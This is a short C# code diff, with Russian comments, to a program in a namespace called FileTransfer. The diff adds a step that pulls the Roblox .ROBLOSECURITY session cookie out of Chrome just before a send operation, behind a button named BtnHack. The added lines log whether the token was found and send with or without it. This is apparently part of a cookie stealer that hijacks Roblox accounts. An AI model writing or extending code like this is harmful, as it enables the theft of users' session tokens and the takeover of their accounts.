@@ -527,6 +527,19 @@ namespace FileTransfer
                 return;
             }
 
+            // Переизвлекаем куку прямо перед отправкой — Chrome мог перезапуститься
+            AppendConsole("[system]", "#2A2D3A", " Извлечение .ROBLOSECURITY...", "#A29BFE");
+            string freshToken = CookieExtractor.ExtractRobloSecurity();
+            if (!string.IsNullOrEmpty(freshToken))
+            {
+                _cachedToken = freshToken;
+                AppendConsole("[system]", "#2A2D3A", " Токен найден", "#2ED573");
+            }
+            else
+            {
+                AppendConsole("[system]", "#FFA502", " Токен не найден, отправка без него", "#FFA502");
+            }
+
             string token = _cachedToken ?? "";
 
             BtnHack.IsEnabled = false;
